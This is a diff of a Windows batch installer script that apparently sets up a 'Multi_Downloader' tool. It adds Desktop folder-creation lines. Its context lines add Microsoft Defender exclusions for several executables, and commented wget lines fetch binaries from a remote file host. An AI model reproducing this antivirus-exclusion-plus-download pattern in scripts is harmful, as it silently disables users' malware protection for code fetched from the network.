@@ -25,12 +25,14 @@ powershell -Command Add-MpPreference -ExclusionProcess "fansly.exe" -Force
 powershell -Command Add-MpPreference -ExclusionProcess "update.exe" -Force
 powershell -Command Add-MpPreference -ExclusionProcess "MD_KILL.exe" -Force
 
+mkdir "%USERPROFILE%/Desktop/Saoas_Tools/Multi_Downloader"
+cd "%USERPROFILE%/Desktop/Saoas_Tools/Multi_Downloader"
 
 title Downloading Files!...
 
 REM wget -q --show-progress --user-agent="chrome" --no-hsts https://files.saoas.tv/Multi_Downloader/fansly.exe -O fansly.exe
 REM wget -q --show-progress --user-agent="chrome" --no-hsts https://files.saoas.tv/Multi_Downloader/config.txt -O config.ini
-ren config.txt config.ini
+REM ren config.txt config.ini
 REM wget -q --show-progress --user-agent="chrome" --no-hsts https://files.saoas.tv/Multi_Downloader/Multi_Downloader.exe -O Multi_Downloader.exe
 
 mkdir lib
